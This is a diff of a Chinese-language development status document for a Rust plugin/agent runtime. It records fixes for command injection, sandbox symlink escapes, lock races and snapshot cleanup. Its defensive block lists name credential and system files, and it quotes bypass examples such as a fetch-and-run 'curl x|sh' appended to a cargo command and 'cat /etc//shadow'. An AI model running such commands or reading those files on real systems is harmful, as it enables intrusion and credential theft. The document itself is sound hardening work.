@@ -2,7 +2,7 @@
 
 ## 1. 判定口径
 
-- 本文基于当前仓库现状整理，最近更新：2026-10-23。
+- 本文基于当前仓库现状整理，最近更新：2026-10-25。
 - 历史规划蓝图已经吸收进 [design-blueprint.md](./design-blueprint.md)，因此本文结论来自三类证据的交叉比对：
   - 设计蓝图：[design-blueprint.md](./design-blueprint.md)
   - 架构文档：[system-overview.md](./system-overview.md)、[contracts-and-loading.md](./contracts-and-loading.md)、[runtime-semantics.md](./runtime-semantics.md)、[maintenance-guide.md](./maintenance-guide.md)
@@ -220,8 +220,8 @@ Agent 现在可以自主完成：读代码 → 理解结构 → 写/改文件 �
 - [x] **命令注入**（P0-1）— `bash -lc` 被换成 `shell_words::split` + `Command::new(argv[0])`；`;`、``` ` ```、`$(...)`、重定向等 shell 元字符不再被解释为语法。`kernel/verifier.rs::run_shell_command`。
 - [x] **命令超时**（P0-1）— 每条 verifier 命令有 10 分钟默认 wall-clock 超时；到点 kill + wait。防止恶意 `sleep infinity` 或死锁 `cargo test` 卡住 iteration 管道。
 - [x] **无命令等于 rubber-stamp**（P0-2）— 全部 stage 均 `Skipped` 时 `tests_passed = false` 且 `quality_score = 0`。至少要有一个 stage 真的 execute 才可能 Pass。
-- [x] **Verify/Promote TOCTOU**（P0-3）— `VerificationReport.source_tree_hash` 记录 verify 时的 sha256；`finalize_plugin_iteration` 在 `promote_candidate` 前重算并比对，不匹配则强制 rollback。
-- [x] **Plugin verifier 目标错位**（P0-4）— `verify_plugin_iteration` 传入 `VerifyOptions::candidate_invoker`，`plugin:` 命令走 staged candidate snapshot 而非 live registry。
+- [x] **Verify/Promote TOCTOU**（P0-3）— `VerificationReport.source_tree_hash` 记录 verify 时的 sha256；`finalize_plugin_iteration` 在 `promote_candidate` 前重算并比对，不匹配则强制 rollback。基线哈希本身失败（不可读文件 / 悬空符号链接 / 权限不足）不再被 `.ok()` 静默吞掉：`VerificationReport.hash_error` 记录失败原因，`detect_plugin_source_drift` 据此把 `Pass` 降级为 rollback（与 promote 前 rehash 失败同等待遇，2026-08-09 补）。
+- [x] **Plugin verifier 目标错位**（P0-4）— `verify_plugin_iteration` 传入 `VerifyOptions::candidate_invoker`，`plugin:` 命令走 staged candidate snapshot 而非 live registry；`plugin:` 命令缺失 `candidate_invoker` 时直接返回 `InvalidArgument`（"verification requires a candidate plugin invoker when plugin: commands are present"），不再回退加载 live `PluginInvoker`（2026-08-09 补）。
 
 ### 5.2.5 Web/SSRF/Session 硬化（2026-07-17 已闭合）
 
@@ -503,6 +503,43 @@ Loaded plugins:
 **验证**：`cargo build` 零 warning；`cargo clippy --all-targets -- -D warnings` 干净；新增单测 `image_input` 12 项（4 种 mime + 未知类型 + 超字节 + 超张数 + 下载失败 + 禁用 + base64 三种 chunk 长度 + 无图纯字符串 + text-first 数组 + transport 失败臂）、envelope 2 项、集成 2 项（`inbound_image_is_inlined_as_a_multimodal_content_part` 断言请求体里是 `data:image/png;base64,` 的数组；`no_images_keeps_the_plain_string_content` 钉住无图仍是字符串）、qq 插件 6 项。线上以真实群图片复核（见部署记录）。
 
 **未做/后续**：`vision_ocr` / `vision_describe` 仍是 `agent_accessible: false`（原生看图已经覆盖主路径，OCR 只在需要抽文字时才有价值；要开的话是 vision 插件一行 flag + 重编，并依赖 `OPENAI_API_KEY`/`tesseract`）。
+
+### 5.2.41b host.rs 三处安全硬化（2026-08-09 已闭合；main 侧条目，编号与 run 分支 5.2.41 重复故加 b 后缀）
+
+- [x] **`resolve_sandboxed_path` 悬空 symlink 逃逸** — 原实现只对"最近已存在祖先"做 canonicalize 校验，最终分量若是悬空 symlink（目标不存在或指向 root 外）即放行，调用方 `fs::write` 会跟随链接在沙箱外创建/覆写文件。现在：最终分量存在时对完整 resolved 路径 canonicalize 校验包含性；最终分量是 symlink 时解析其目标（read_link + canonicalize，相对目标按链接父目录拼接）并要求目标在 root 内；悬空链接直接拒绝（`path is a dangling symlink: <rel>`）。指向 root 内的 symlink 仍允许（原有语义）。`crates/cordis-runtime/src/host.rs::resolve_sandboxed_path`。回归测试见 `tests/host_boot_session_arms.rs`（dangling-abs / dangling-rel / inside-link / inside-abs / ext-link）。
+- [x] **敏感路径/命令子串黑名单绕过** — 原 `lower.contains(kw)` 子串匹配被 `/etc//passwd`、`/proc//self`、`apikey` / `api-key` 等变体绕过。`check_sensitive_path` 先做纯词法路径规范化（折叠重复 `/`、去尾部 `/`、词法解析 `.`/`..`，不做 fs 操作），再按组件链匹配 `etc/passwd`、`etc/shadow`，按根级组件边界匹配 `proc`/`sys`，按组件前缀匹配 `.ssh`/`.env`/`id_rsa`/`credentials`/`auth.json` 等，并对 `access_token`/`api_key`/`api_secret`/`private_key` 做 `-`、` ` → `_` 归一化（含去下划线紧凑形，拦截 `api-key`/`apikey` 变体）；归一化只作用于这些关键词，`plugins/x/api-utils.rs` 不误伤。`check_sensitive_command` 保留原始子串检查，另加 argv token 级路径门（shell_words 分词，形如路径的 token 跑敏感路径匹配，拦 `head /etc/passwd`、`cat /etc//shadow`、`~/.ssh/` 访问）与 shell 解释器拦截（argv[0] ∈ {sh,bash,dash,ksh,zsh,fish} 且含 `-c`/`-lc`/`--command` → `blocked: shell interpreter invocation`）。
+- [x] **Plugin-iteration 验证命令去 shell**（对齐 P0-17）— `validated_verification_command` 的 `trimmed.starts_with(required_prefix)` 前缀白名单可被 `cargo check && curl x|sh` 绕过，默认命令 `format!("… -p {pp}")` 把 LLM 可控的 plugin_path 拼进 `bash -lc` 字符串。现在：新增共享 argv 门 `validate_verification_argv`（`shell_words::split` 分词、`argv[0]=="cargo"`、`argv[1]` 为所需 op、任何 argv 元素含 `; & | \` $ < > 换行` 即拒），`run_checked_command` 不再经 shell，直接 `Command::new("cargo").args(...)`；默认命令改为 argv 构造 `verification_default_command`，plugin_path 经 `verification_package_segment` 校验（剥离前缀 `/`、拒绝空、拒绝白名单外字符与 `..`，失败返回 InvalidArgument）后作为独立 `["-p", pp]` argv 元素追加；裸别名 `check`/`test` 仍映射到默认 argv。错误文本保持逐字节兼容（`verification tool only allows commands starting with …`）。
+
+### 5.2.40b 插件工件体积：exclude 清单里的插件收不到 strip profile（2026-08-06；main 侧条目，同上编号重复故加 b 后缀）
+
+**背景**：22 个 `.so` 合计 234 MB，dlopen 全加载时这些体积同时进内存。
+
+**定位**：`61f69ef`（2026-06-12）给 `fixtures/plugins/Cargo.toml` 加过
+`[profile.dev] strip = "debuginfo"`，对 workspace 成员确实生效——实测
+`llm_openai.so`、`time.so` 的调试段均为 0。但 `expr/*` 的 10 个插件与 `_net`
+列在同一份清单的 `exclude` 里，且各自 `Cargo.toml` 末尾有一个空 `[workspace]`
+使其成为**独立 workspace 根**，因此父级 profile 完全够不着它们：
+`expr_evaluator_add.so` 8.95 MB 里有 5.9 MB 是调试段。一个只做加法的插件
+和 `llm_openai` 处在同一量级，信号本身就很清楚。
+
+**改动**：给这 10 个产出工件的 excluded 插件各自补上 `[profile.dev]`；同时把
+父 workspace 从 `strip = "debuginfo"` 升到 `strip = "symbols"`（后者额外去掉
+`.symtab`）。`_net` 不需要——它是 rlib、不产出工件，作为 path 依赖时随
+消费方（`web` / `vision`）的 profile 一起构建。
+
+**为什么 `strip = "symbols"` 不会破坏插件加载**：dlopen/dlsym 走的是 `.dynsym`，
+strip 只删 `.symtab`。实测 `expr_evaluator_add.so` 剥后仍保留 204 个 cordis
+动态符号，architecture 套件 17 项全过。
+
+**结果**：234 MB → 142 MB（−92 MB，−39%）；`expr` 系列每个 8.95 → 2.33 MB。
+剩余大头是四个网络插件各自静态链接的 reqwest + rustls（llm_openai 18.7、
+web 18.1、feishu 17.0、qq 16.4、vision 12.3 MB），属后续阶段。
+
+**遗留**：插件仍各自静态链接 Rust std 与 serde/serde_json/SDK（`ldd` 只显示
+libc/libgcc）。已实测：`-C prefer-dynamic` 加上把 SDK 做成 dylib 后，平凡插件
+可降到 0.20 MB，但需要宿主同步改造、解决 `libstd-<hash>.so` 的运行时查找，
+并补 `rust-toolchain.toml`——当前 ABI 用 Rust `fn` 指针与按值 `String`，
+本就与 rustc 版本硬耦合却没有锁定。
 
 ### 5.2.40 QQ 通道止血：会话身份 / tool_calls 链完整性 / 死信治理（2026-10-21）
 
@@ -1018,6 +1055,14 @@ cd fixtures/plugins/expr/lexer && cargo test --lib  # excluded, external tests o
 - [x] **P2-12 QQ 硬编码路径**（部分修）— 新 `runtime_config_path()` 从 `$CORDIS_FIXTURES_ROOT` 派生；env 未设置时回退到历史 `/root/CordisClaw/...`。
 - [x] **serve 加 `--no-startup-invoke`（本地测试劫持线上流量修复，2026-07-22）** — serve 启动段原先无条件执行 `startup_invoke.json`（起 qq HTTP 8099 + 连真实飞书 WSS）；本地落地测试实例与线上 bot 共用渠道凭证，测试期间飞书把用户消息推给测试实例，实例发出"思考中"两段式占位卡片后被测试脚本 exit 杀掉，内存 `PENDING_CARDS` 丢失，用户侧卡片永久停留（已实际发生）。新增 `--no-startup-invoke` flag + `CORDIS_NO_STARTUP_INVOKE` 环境变量：跳过启动段全部自动 invoke 并打印明确日志，插件加载 / invoke / execute / REPL 不受影响。`parse_root_and_runtime_only` 重构为 `parse_serve_args`（env 读取在外壳，内层纯函数可测），main.rs 补 4 个参数解析单测。约定：本地落地测试一律带该开关。
 - [x] **P2-13 fingerprint per-build**（fixture 迁移完成）— 21 个 fixture 插件的 `abi_fingerprint_value()` 全部从硬编码 `AbiFingerprint { rustc_version: "1.85.1", target_triple: "x86_64-unknown-linux-gnu", ... }` 迁移到 `AbiFingerprint::current_build(crate_hash, api_hash)`；Cargo.toml 的 `[package.metadata.cordis.abi_fingerprint]` 删除 rustc_version/target_triple 两行（SDK 的 `AbiFingerprint` 加 serde default，缺省时填当前工具链值，显式声明仍生效）；host.rs 两处插件脚手架模板与 agent.rs 的插件创建 prompt 同步。修复动机：硬编码 linux triple 导致 macOS 等非 linux-x86 宿主上所有 dylib 插件被 target_triple 预检拒载（`Unavailable(AbiMismatch)`），serve 无法冷启动。SDK 补 serde-default 单测；macOS (aarch64-apple-darwin) 实机 serve + invoke 验证通过。
+
+- [x] **R6 ArtifactBuildLock 陈旧锁回收 + Drop 归属判定**（2026-08-09）— 两处构建锁缺陷：(a) `maybe_remove_stale_lock_with_fs` 原判据 `!lock_pid_is_live(pid) || age > 300s` 是 OR 条件——持有者进程仍存活、只是构建超过 5 分钟（默认构建超时 20min）锁就被后来者 unlink 接管；(b) `ArtifactBuildLock` 的 `Drop` 无条件 `remove_file`——A 的锁被 B 夺走后 A 结束时的 Drop 会把 B 的锁文件删掉。修复：可解析 JSON 锁只按 `!lock_pid_is_live(state.pid)` 回收，去掉 age 闸门（`STALE_LOCK_TIMEOUT` 常量删除；300s 语义注释改写为 pid 复用风险的取舍——死进程 pid 被 OS 复用到无关进程时陈旧锁会保留到该 pid 死亡，属有意的安全优先取舍；legacy / 无法解析文件仍走 mtime 路径 `LEGACY_STALE_LOCK_TIMEOUT` 不动）；`ArtifactBuildLock` 增加 `pid: u32` 字段（acquire 成功时记录 `process::id()`），`Drop` 改为读回锁文件解析 `ArtifactBuildLockState`，仅当 `parsed.pid == self.pid`（或文件已不存在）才删除，文件已是他人 pid → 不删（锁已被接管），读失败 / 解析失败 → 保守不删 + eprintln 诊断（避免误删他人锁；残留文件可由 legacy mtime 路径兜底回收）。测试：新增 5 个单测（live pid + 超龄 JSON 锁必须保留 / Drop 时他人 pid 不删 / Drop 时不可解析不删 / Drop 时文件已缺失 no-op / Drop 时文件不可读 EISDIR 不删）。
+- [x] **R7 rebuild_plugin_workspace 补 ArtifactBuildLock**（2026-08-09）— agent 工具入口（host.rs 直调）此前完全绕过 `prepare_artifacts` 的构建锁：stage dylib 后对 index.json 做 load-修改-整文件写回，与并发 prepare_artifacts 互踩 artifacts 与 index.json（读-改-写丢对方更新，full_rebuild 时 artifacts 目录还会被 remove_dir_all）。修复：命名插件路径在入口处（"/" 委托检查之后）获取同一个 `ArtifactBuildLock`（与 prepare_artifacts 共用 fixtures root 下的 `.artifacts-build.lock`），作用域持有到函数结束，超时按 `ArtifactBuildLockTimeout` 传播。"/" 全量路径委托 `rebuild_fixture_artifacts` → `prepare_artifacts`（内部已取锁），此处若再取锁会自死锁（同进程同 pid 锁重入），调用图确认 prepare_artifacts 不会回调 rebuild_plugin_workspace。测试：新增 2 个集成测试（rebuild 期间锁文件存在且记录本进程 pid（线程 + 轮询断言，锁持有到返回后文件消失）/ 预先埋入 dead-pid 陈旧锁时 rebuild 会回收并最终释放），既有全部 rebuild / prepare 集成测试照常通过。
+- [x] **R1 agent_send 摘除-重插窗口**（2026-08-09）— `agent_send` 把 session 从 `agent_sessions` remove 出来、锁外跑 `respond`（可能很长）、最后无条件插回，存在三个缺陷：(a) respond panic 时插回永不执行，会话永久丢失；(b) respond 期间 `drop_session` 只删到快照，结束后会话被复活且 auto_save 重写快照；(c) 并发第二个 agent_send 误报 `AgentSessionNotFound`，消息静默丢失。修复：`RuntimeHost` 新增 `inflight_sessions` / `dropped_during_turn` 两个 `BTreeSet`（struct 字段 + boot 初始化同步）；`agent_send` 摘除与 inflight 标记在 `inflight → agent_sessions` 锁序下原子完成（无"已 remove 未标记"窗口），respond 用 `catch_unwind(AssertUnwindSafe(..))` 包裹，panic 也走收尾（会话不丢失，返回 `Invariant` 错误）；收尾在 inflight 锁下原子完成"检查 dropped → auto_save → 插回 → 摘除标记"，与 `drop_session` 的标记互斥，杜绝复活竞态；`drop_session` 对 in-flight 会话标记 `dropped_during_turn` 而非只删快照；`agent_start_with` 对新会话做防御性 `mark_dropped_if_inflight`（当前 id 由 `normalize_request_id` 生成不会撞车）。`core/error.rs` 新增 `AgentSessionBusy { session_id }`（文本风格与 `AgentSessionNotFound` 一致）。测试：单测 4 个（respond panic 后会话仍在且可继续使用 / panic 错误文本三载荷逐字节 / mark_dropped_if_inflight 双臂 / AgentSessionBusy 变体文本）＋ 集成 2 个（阻塞 mock server 控制时序：respond 期间 drop_session → turn 结束不复活不重写快照；并发第二个 send 得 `AgentSessionBusy` 而非 `NotFound`）。
+- [x] **R2 cleanup_retired_snapshots 驱逐删除被 pin 的快照目录**（2026-08-09）— 上限驱逐循环对最旧条目无条件 `remove_dir_all`，无视 Weak 仍被 in-flight session 的强 Arc pin 住——被 pin 快照上的 Process 插件后续 invoke 全部 spawn failed。修复：上限驱逐提取为具名函数 `evict_retired_snapshots`（retain 之后才死的竞态窗口内才删目录），`upgrade().is_some()` 的活条目立即停止、保留积压并记诊断日志（`[snapshot-retire] ... pinned by live sessions; keeping backlog`），只删已死条目。测试：更新原 live-cap 测试为新语义（70 条全 pin 保留、目录全存活），新增 2 个（70 pinned + 10 dead 混合：dead 照删 pinned 全保留 / 纯函数"删死条目"臂直测（retain 后竞态窗口））。
+- [x] **R3 promote/rollback/approve 不校验 candidate 身份**（2026-08-09）— `iterate_plugins` Step 4 `reload_candidate` 暂存候选、Step 7 finalize 直接 take 当下条目，不校验 snapshot_id 是否等于本迭代暂存的那份；`reload_candidate` 是公开 API 且内核定时器自动迭代可触发，两步之间候选可被替换，导致 promote/rollback 一份从未验证的快照。修复：`promote_candidate` / `rollback_candidate` 拆出 `*_matching(expected: Option<&str>)` 内部变体（公开 API 不变，REPL/手动路径传 `None` 不校验）；`finalize_plugin_iteration` 把 Step 4 记录的 `state.candidate.candidate_snapshot_id` 传给 promote/rollback（`rollback_candidate_if_staged` 同步加 expected 参数）；promote 的身份校验在 take 同一把锁内原子完成，rollback 在 restore 之前完成，不一致返回 `Invariant`（`candidate_replaced_error`，文本 "candidate snapshot replaced during plugin iteration: expected X, got Y"）且不取走候选；`approve_blocked_iteration` 用 blocked 结果里记录的 candidate 校验后 promote，不一致时保留 blocked 条目并报错。测试：单测 4 个（promote 拒绝替换候选且候选仍 staged / rollback 同样拒绝 / finalize Pass-Pass 路径拒绝 / 错误文本逐字节）＋ 集成 1 个（Blocked 后公开 API reload 替换候选 → approve 拒绝、blocked 条目保留）。
+- [x] **R8 snapshot GC 的 staging 锁在 remove_dir_all 前已释放**（2026-08-09）— `try_acquire_for_gc` open→flock(EX|NB)→`inspect` 立即解锁返回 true，调用方随后 `dir_size_bytes` + `remove_dir_all`；锁只当探针用，试锁→解锁→删除之间并发 boot 仍可插进 staging 窗口。修复：`try_acquire_for_gc` 改为返回持有锁的 `Option<Guard>`（复用既有 `snapshot_staging_lock::Guard`，flock 持有到 Guard drop），GC 调用方持锁跨越 `dir_size_bytes` 与 `remove_dir_all` 全程，删除完成后 drop 释放；同进程 boot 的 `hold` 非阻塞试锁失败本就退化为 mtime-only 行为，不会死锁。测试：更新既有 `try_acquire_for_gc` 断言为 `is_none()/is_some()`，新增 1 个（GC Guard 持锁期间用锁文件路径直接 `flock(EX|NB)` 断言并发取锁失败，Guard drop 后同一 fd 可取）。
+- [x] **R9 blocked_iterations 无上限**（2026-08-09）— Blocked/InfrastructureFailure 一律 `blocked.insert(iteration_id, 完整结果)`，仅靠 approve 或后续同 id 结局摘除；iteration_id 每次迭代唯一，反复 Blocked 无界增长。修复：插入后若超 64 条（`MAX_BLOCKED_ITERATIONS`，与 plugin_history / invocation_samples 上限一致）则 `pop_first()` 淘汰最旧条目（BTreeMap 按 key 有序，iteration_id 由 `normalize_request_id` 生成、前缀带毫秒时间戳）。测试：新增 1 个（插入 65 条唯一 id 的 Blocked → map 长度 64、最旧被淘汰、最新保留）。
 
 **S 批 (fixture / naming / misc):**
 
